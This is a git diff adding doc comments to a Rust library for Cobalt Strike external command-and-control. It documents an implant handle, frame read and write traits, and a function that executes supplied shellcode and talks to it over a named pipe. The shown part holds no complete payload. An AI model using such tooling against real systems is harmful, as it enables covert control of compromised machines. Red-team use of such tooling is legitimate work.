@@ -1,5 +1,14 @@
 #![warn(missing_docs)]
 
+//! Helper utilities for creating [external c2][1] systems for [cobaltstrike][2].
+//!
+//! ![C2](https://i.ibb.co/Cszd81H/externalc2.png)
+//!
+//!
+//!
+//![1]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm
+//! [2]: https://www.cobaltstrike.com/
+
 use std::{
     ffi::c_void,
     io::{Error, ErrorKind, Read, Write},
@@ -26,6 +35,8 @@ use windows::{
     },
 };
 
+/// handle to a running cobalt strike implant.  use create implant from buf to create
+/// and instance of this struct
 pub struct Implant {
     handle: HANDLE,
 }
@@ -83,15 +94,23 @@ impl Write for Implant {
         )))?);
     }
 
+    // This probably needs to be actually implemented but im not sure how.
     fn flush(&mut self) -> std::io::Result<()> {
         return Ok(());
     }
 }
 
+/// Read a single cobaltstrike from from a readable.  a cobalt strike frame is a 32le
+/// size followed by a buffer of that size.
 pub trait CSFrameRead {
+    /// Read the frame.
     fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
 }
+
+/// Write a single cobaltstrike to a writeable.  writes a 32le size and then the buffer
+/// provided.
 pub trait CSFrameWrite {
+    /// Write the frame.
     fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>>;
 }
 
@@ -120,6 +139,11 @@ where
     }
 }
 
+/// Allocates memory and executes cobalt strike shell code and establishes a connection
+/// to it over a named pipe.  The returned implant can then be communicated with via
+/// read frame and write frame.  Use covert_server to establish a connection to a c2
+/// server and get the shell code for a new instance.  ensure that when getting shell
+/// code from the c2 server that the pipe name and architecture match.
 pub fn create_implant_from_buf(
     shell_code: Vec<u8>,
     pipename: &str,
